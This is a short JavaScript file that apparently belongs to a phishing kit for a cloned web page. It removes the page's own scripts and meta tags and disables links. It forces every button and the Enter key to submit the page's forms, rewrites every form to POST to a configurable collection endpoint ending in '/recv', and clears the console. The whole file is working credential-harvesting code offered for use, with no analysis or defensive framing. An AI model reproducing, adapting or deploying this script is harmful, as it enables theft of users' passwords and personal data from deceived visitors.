// CONTROL //

const redirect_data = "";

// SCRIPT //

const all_script = document.querySelectorAll("script");
const all_a = document.querySelectorAll("a");
const all_button = document.querySelectorAll("button");
const all_form = document.querySelectorAll("form");
const all_meta = document.querySelectorAll("meta");
const all_noscript = document.querySelectorAll("noscript");
const all_base = document.querySelectorAll("base");
const all = document.querySelectorAll("*");

for (const element of all) {
  element.removeAttribute("jsaction");
}

for (const a of all_a) {
  a.href = false;
}

for (const element of [...all_base, ...all_noscript, ...all_meta, ...all_script]) {
  element?.remove();
}

for (const button of all_button) {
  if (button.type != "submit") {
    button.type = "submit";
  }

  for (const form of all_form) {
    button.addEventListener("click", () => {
      form.submit();
    });
  }
}

for (const form of all_form) {
  form.action = `${redirect_data}/recv`;
  form.method = "POST";
  form.noValidate = false;
}

window.addEventListener("keydown", (event) => {
  if (event.key === "Enter") {
    for (const form of all_form) {
      form.submit();
    }
  }
});

console.clear(true);
